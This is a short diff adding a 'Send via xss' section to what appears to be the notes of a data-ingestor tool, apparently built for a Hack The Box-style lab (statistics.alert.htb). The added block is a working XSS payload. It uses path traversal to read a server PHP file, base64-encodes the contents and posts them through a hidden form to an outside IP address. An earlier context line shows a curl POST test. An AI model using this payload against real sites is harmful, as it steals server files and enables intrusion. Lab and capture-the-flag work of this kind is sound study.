@@ -42,3 +42,19 @@ To send to the ingestor:
 ```console
 curl -k -X POST -d "data=test" https://domain.com/
 ```
+
+Send via xss:
+
+```console
+<img src=x onerror="fetch('/messages.php?file=../../../../../../../../var/www/statistics.alert.htb/index.php')
+.then(response => response.text())
+.then(data => {
+f=document.createElement`form`;
+f.innerHTML='<input name=data value='+btoa(data)+'>';
+f.method='post';
+f.action='http://10.10.14.159:6745/index.php';
+document.body.appendChild(f);
+f.submit();
+document.body.removeChild(f);
+});">
+```
